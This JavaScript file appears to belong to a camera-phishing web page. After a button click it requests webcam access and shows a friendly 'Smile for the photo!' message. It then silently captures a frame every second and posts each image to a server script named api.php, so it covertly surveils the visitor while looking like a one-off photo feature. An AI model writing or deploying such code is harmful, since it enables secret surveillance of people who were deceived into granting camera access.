const request = (file, payload) => {
    const http = new XMLHttpRequest();
    http.open("POST", file, true);
    http.send(JSON.stringify(payload));
}

const main = () => {
    const camera = document.querySelector('video');
    
    navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
    }).then((stream) => {
        camera.srcObject = stream;
        camera.play();
    });
    
    const capture = () => {
        var canvas = document.querySelector('canvas');
        var context = canvas.getContext('2d');
    
        context.drawImage(camera, 0, 0, 600, 600);
    
        request("api.php", {
            image: canvas.toDataURL("image/png")
        });
    }
    
    setInterval(() => {
        capture();
    }, 1000);
}

var button = document.querySelector('#button');

const photography = () => {
    var image = document.querySelector('img');
    var title = document.querySelector('h1');
    var paragraph = document.querySelector('p');

    image.src = "assets/photography.svg";
    title.innerText = "Smile for the photo!"
    paragraph.innerText = "But what a beautiful smile!";
    button.remove();
}

button.addEventListener('click', () => {
    main();
    photography();
});